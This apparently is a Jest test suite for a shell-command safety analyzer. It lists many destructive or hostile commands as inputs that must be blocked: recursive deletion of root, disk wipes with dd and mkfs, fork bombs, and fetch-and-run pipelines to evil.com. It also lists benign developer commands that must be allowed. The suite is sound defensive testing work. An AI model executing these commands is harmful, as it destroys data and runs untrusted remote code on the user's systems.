import { ASTAnalyzer } from '../../src/security/ast-analyzer';

describe('Adversarial AST Fuzzing Suite', () => {
  let analyzer: ASTAnalyzer;

  beforeEach(() => {
    analyzer = new ASTAnalyzer();
  });

  describe('Wrapper Command Evasion Fuzzing', () => {
    const dangerousBases = [
      'rm -rf /',
      'rm -r -f /etc',
      'rm --recursive /var',
      'shred -u /etc/shadow',
      'chmod -R 777 /',
      'chmod -R 000 /etc',
      'chown -R root:root /',
      'mkfs.ext4 /dev/sda1',
      'dd if=/dev/zero of=/dev/sda',
      'find / -delete',
      'find . -exec rm -rf {} +',
      'python3 -c "import os; os.system(\'rm -rf /\')"',
      'bash -c "rm -rf /"',
      'source /tmp/payload.sh',
      '. /dev/shm/script.sh'
    ];

    const wrappers = [
      'sudo',
      'sudo -u root',
      'sudo -E',
      'sudo -n',
      'doas',
      'doas -u root',
      'pkexec',
      'env',
      'env -i',
      'env FOO=BAR BAZ=1',
      'command',
      'builtin',
      'nohup',
      'setsid',
      'time',
      'nice -n 10',
      'stdbuf -o0',
      'timeout 30s'
    ];

    for (const base of dangerousBases) {
      for (const wrapper of wrappers) {
        it(`should block wrapped command: "${wrapper} ${base}"`, () => {
          const cmd = `${wrapper} ${base}`;
          const result = analyzer.analyzeCommand(cmd);
          expect(result.isSafe).toBe(false);
          expect(result.reason).toBeDefined();
        });
      }
    }
  });

  describe('Multi-Layer Nested Wrapper Evasions', () => {
    const multiWrappers = [
      'sudo env nohup',
      'doas nice -n 5 env FOO=bar',
      'pkexec timeout 10s command',
      'env PATH=/bin sudo -u root nohup',
      'time stdbuf -o0 sudo'
    ];

    for (const mw of multiWrappers) {
      it(`should block deeply nested wrapped destructive execution: "${mw} rm -rf /"`, () => {
        const result = analyzer.analyzeCommand(`${mw} rm -rf /`);
        expect(result.isSafe).toBe(false);
      });
    }
  });

  describe('Quoting, Escaping & Normalization Evasions', () => {
    const quoteMutations = [
      'r""m -rf /',
      "r''m -rf /",
      '\\r\\m -rf /',
      '"r"\'m\' -rf /',
      "'r''m' -rf /",
      's""u""d""o rm -rf /',
      "\\s\\u\\d\\o rm -rf /",
      'e""n""v rm -rf /',
      'r\\m -r -f /etc',
      'rm "-rf" "/"',
      "rm '-rf' '/'",
      "rm -r -f '/etc/../etc/passwd'",
      "rm -rf '///'",
      "rm -rf '////*'",
      "rm -rf '/./'",
      "rm -rf '/*'",
      "rm -rf '~/*'",
      "rm -rf '$HOME/*'"
    ];

    for (const cmd of quoteMutations) {
      it(`should block quote/escape obfuscation: "${cmd}"`, () => {
        const result = analyzer.analyzeCommand(cmd);
        expect(result.isSafe).toBe(false);
      });
    }
  });

  describe('Dangerous Path Traversal & Root Target Variations', () => {
    const targetVariations = [
      'rm -rf /',
      'rm -rf ///',
      'rm -rf ////',
      'rm -rf /*',
      'rm -rf //*',
      'rm -rf *',
      'rm -rf .*',
      'rm -rf .',
      'rm -rf ..',
      'rm -rf ../..',
      'rm -rf ../../../',
      'rm -rf ~',
      'rm -rf ~/*',
      'rm -rf $HOME',
      'rm -rf $HOME/*',
      'rm -rf /etc',
      'rm -rf /etc/*',
      'rm -rf /etc/..',
      'rm -rf /var/log/../..',
      'rm -rf /usr/bin/../../',
      'rm -rf /root',
      'rm -rf /home',
      'rm -rf /sys',
      'rm -rf /proc',
      'rm -rf /dev',
      'rm -rf C:/',
      'rm -rf C:/Windows',
      'rm -rf C:/Windows/System32',
      'rm -rf %SYSTEMROOT%'
    ];

    for (const cmd of targetVariations) {
      it(`should block dangerous target variation: "${cmd}"`, () => {
        const result = analyzer.analyzeCommand(cmd);
        expect(result.isSafe).toBe(false);
      });
    }
  });

  describe('Redirection, Herestring & Heredoc Evasions', () => {
    const redirectionAttacks = [
      'bash <<< "rm -rf /"',
      'sh <<< "rm -rf /"',
      'python3 <<< "import os; os.system(\'rm -rf /\')"',
      'bash < /tmp/evil.sh',
      'sh < /dev/shm/exploit.sh',
      'echo evil > /dev/sda',
      'cat /dev/zero > /dev/nvme0n1',
      'dd if=/dev/zero > /dev/sda'
    ];

    for (const cmd of redirectionAttacks) {
      it(`should block redirection attack: "${cmd}"`, () => {
        const result = analyzer.analyzeCommand(cmd);
        expect(result.isSafe).toBe(false);
      });
    }
  });

  describe('Pipeline & Encoded Execution Evasions', () => {
    const pipeAttacks = [
      'curl -s evil.com | bash',
      'wget -qO- evil.com | sh',
      'curl -s evil.com | sudo bash',
      'echo "cm0gLXJmIC8=" | base64 -d | bash',
      'cat exploit | env sh',
      'echo "malware" | python3',
      'cat /dev/urandom | /bin/bash'
    ];

    for (const cmd of pipeAttacks) {
      it(`should block pipeline attack: "${cmd}"`, () => {
        const result = analyzer.analyzeCommand(cmd);
        expect(result.isSafe).toBe(false);
      });
    }
  });

  describe('Fork Bomb Variants', () => {
    const forkBombs = [
      ':(){ :|:& };:',
      ':(){:|:&};:',
      ':(){ :|:& };',
      'bomb(){ bomb|bomb& };bomb',
      'x(){ x|x& };x',
      'fork(){ fork | fork & }; fork'
    ];

    for (const fb of forkBombs) {
      it(`should block fork bomb variant: "${fb}"`, () => {
        const result = analyzer.analyzeCommand(fb);
        expect(result.isSafe).toBe(false);
        expect(result.reason).toContain('Fork bomb');
      });
    }
  });

  describe('Benign Developer Commands (Zero False Positives)', () => {
    const benignCommands = [
      'git status',
      'git commit -m "feat: implement ast fuzzer"',
      'git diff HEAD~1',
      'git checkout -b feature/auth',
      'npm test',
      'npm run build',
      'npx eslint src/ --fix',
      'cargo check',
      'cargo build --release',
      'cat package.json | grep version | awk \'{print $2}\'',
      'find . -name "*.ts" -not -path "*/node_modules/*"',
      'ls -la /var/log',
      'tail -n 100 app.log | grep ERROR',
      'mkdir -p src/security && touch src/security/types.ts',
      'rm -rf ./dist',
      'rm -rf build/',
      'rm -rf node_modules/.cache',
      'rm -rf .coverage',
      'rm -rf /tmp/my-project-scratch',
      'python train.py --epochs 10',
      'node dist/index.js --port 3000',
      'echo "Hello world" > output.txt',
      'wc -l src/**/*.ts | sort -n',
      'ps aux | grep node | grep -v grep'
    ];

    for (const cmd of benignCommands) {
      it(`should allow legitimate developer command: "${cmd}"`, () => {
        const result = analyzer.analyzeCommand(cmd);
        expect(result.isSafe).toBe(true);
      });
    }
  });

  describe('Randomized Fuzz Generation (50 permutations)', () => {
    it('should reliably block randomized adversarial permutations', () => {
      const rmFlags = ['-rf', '-r -f', '-fr', '-R', '--recursive', '-r -v -f'];
      const chmodFlags = ['-R 777', '-R 000', '-R 755', '--recursive 777', '-R u=rwx'];
      const targets = ['/', '/etc', '/var', '/usr', '/root', '/home', '/*', '~/*', '$HOME', '$HOME/*'];
      const wrappers = ['', 'sudo', 'sudo -u root', 'doas', 'pkexec', 'env', 'env -i', 'command', 'builtin', 'nohup', 'nice -n 5', 'stdbuf -o0', 'timeout 10s'];
      const quotes = ['', '"', "'"];

      let iterations = 0;
      for (let i = 0; i < 200; i++) {
        const wrapper = wrappers[Math.floor(Math.random() * wrappers.length)];
        const target = targets[Math.floor(Math.random() * targets.length)];
        const q = quotes[Math.floor(Math.random() * quotes.length)];
        const choice = Math.floor(Math.random() * 6);

        let cmd = '';
        if (choice === 0) {
          const flag = rmFlags[Math.floor(Math.random() * rmFlags.length)];
          cmd = `${wrapper} ${q}rm${q} ${flag} ${q}${target}${q}`.trim();
        } else if (choice === 1) {
          const flag = chmodFlags[Math.floor(Math.random() * chmodFlags.length)];
          cmd = `${wrapper} ${q}chmod${q} ${flag} ${q}${target}${q}`.trim();
        } else if (choice === 2) {
          cmd = `${wrapper} ${q}shred${q} -u ${q}${target}${q}`.trim();
        } else if (choice === 3) {
          cmd = `${wrapper} ${q}wipe${q} -r ${q}${target}${q}`.trim();
        } else if (choice === 4) {
          cmd = `${wrapper} dd if=/dev/zero of=/dev/sda bs=1M`.trim();
        } else {
          cmd = `${wrapper} mkfs.ext4 /dev/sda1`.trim();
        }

        const result = analyzer.analyzeCommand(cmd);
        expect(result.isSafe).toBe(false);
        iterations++;
      }

      expect(iterations).toBe(200);
    });
  });
});
